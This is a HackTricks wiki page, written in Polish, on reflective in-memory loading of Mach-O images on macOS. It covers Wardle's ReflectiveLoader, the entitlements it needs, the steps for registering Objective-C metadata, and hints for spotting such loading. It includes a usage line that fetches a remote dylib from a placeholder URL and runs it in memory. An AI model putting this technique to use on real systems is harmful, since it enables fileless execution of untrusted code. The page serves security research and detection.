# Reflective loading Mach-O w macOS

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader mapuje obraz Mach-O z bajtów znajdujących się już we własnym procesie, a następnie linkuje go i uruchamia jego inicjalizatory bez proszenia systemowego loadera o otwarcie pliku payloadu. Jest to **wykonywanie kodu w procesie**, a nie mechanizm eskalacji uprawnień ani wstrzykiwania do zdalnego procesu.<sup>[[2]](#references)</sup>

W nowszych wersjach macOS stara ścieżka `NSCreateObjectFileImageFromMemory`/`NSLinkModule` zapisuje obraz na dysku. ReflectiveLoader osadza natomiast starszy kod ładowania Apple dyld; Wardle zademonstrował to w macOS 15 i 26.<sup>[[2]](#references)[[3]](#references)</sup>

Jeśli loader korzysta z Hardened Runtime, jego niepodpisany kod w pamięci wymaga wyjątku zezwalającego na pamięć wykonywalną, takiego jak `com.apple.security.cs.allow-unsigned-executable-memory` lub `com.apple.security.cs.disable-executable-page-protection`; w przeciwnym razie egzekwowanie zasad podpisywania kodu zablokuje wykonanie. Jest to ograniczenie dotyczące podpisywania loadera, a nie mechanizm eskalacji uprawnień. Zobacz [dokumentację uprawnień macOS](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

W przypadku PoC podaj URL serwujący surowy **bundle, framework lub dylib Mach-O**. Plik `main.mm` odrzuca puste pobrane dane i informuje, że payloady korzystające z `LC_DYLD_CHAINED_FIXUPS` nie są obsługiwane. Akceptowana jest również lokalna ścieżka, ale takie użycie nie jest bezplikowym workflow. Wariant z URL odczytuje bajty do `NSData` i przekazuje bufor oraz jego długość do `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Wbudowany loader wywołuje `ImageLoaderMachO::instantiateFromMemory`, a następnie `image->link`. Rejestruje metadane Objective-C **po linkowaniu, ale przed** wywołaniem `image->runInitializers`, które uruchamia konstruktory.<sup>[[5]](#references)</sup> Bez rejestracji konstruktor wysyłający komunikat Objective-C może zakończyć się błędem `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Zobacz [standardowy przebieg ładowania obrazów przez dyld](macos-library-injection/macos-dyld-process.md#flow) oraz [opis sekcji Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Aktywowanie metadanych Objective-C

W przeciwieństwie do standardowego ładowania przez dyld, osadzenie starszego loadera obrazów nie sprawia automatycznie, że metadane Objective-C payloadu stają się dostępne dla `libobjc`.<sup>[[3]](#references)</sup> Dostosowane podejście LLVM JIT skanuje sekcje Objective-C w zmapowanych `__DATA` i `__DATA_CONST`, a następnie wykonuje poniższe kroki przed uruchomieniem konstruktorów:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Przejdź przez `__objc_selrefs`, wykonując kroki o rozmiarze `sizeof(SEL)`. Pobierz nazwę każdego niepustego selektora za pomocą `sel_getName`, przekaż ją do `sel_registerName` i zastąp wskaźnik w sekcji kanonicznym `SEL`.
2. Zbierz klasy z `__objc_classlist` i zarejestruj je za pomocą `objc_readClassPair`, najpierw rozwiązując zależności od klas bazowych.
3. Przepisz odwołania w `__objc_classrefs` i `__objc_superrefs`, aby wskazywały zarejestrowane klasy lub metaklasy, a także dołącz metody kategorii z `__objc_catlist`.

Na przykład naprawianie selektorów w `ObjCRuntime.cpp` jest równoważne z:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC opiera się na wewnętrznym działaniu środowiska uruchomieniowego Objective-C i nie obsługuje wszystkich funkcji formatu Mach-O, dlatego jego kod rejestracji stanowi przykład implementacji, a nie uniwersalny loader typu drop-in.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Rejestracja jest potrzebna zarówno w przypadku używanych klas i metod Apple, jak i klas zdefiniowanych przez payload.<sup>[[3]](#references)</sup>

W testach autora obraz załadowany refleksyjnie nie pojawia się w `dyld_all_image_infos`. Jego anonimowe mapowania z uprawnieniami wykonywania mogą być natomiast widoczne w `vmmap` jako nienazwane regiony `dylib`; próbkowane ramki mogą być wyświetlane jako `<unknown binary>`. Są to wskazówki przydatne podczas inspekcji, ale nie pozwalają wiarygodnie przypisać obrazu do tego loadera. Dostęp do informacji o zadaniach innego procesu wymaga odpowiednich uprawnień. Zobacz [zrzuty pamięci macOS](../macos-files-folders-and-binaries/macos-memory-dumping.md), aby poznać ograniczenia dostępu do procesów.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C i Swift w macOS: zbiór wiedzy](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Przywracanie refleksyjnego ładowania kodu w macOS (część I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Przywracanie refleksyjnego ładowania kodu w macOS (część II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
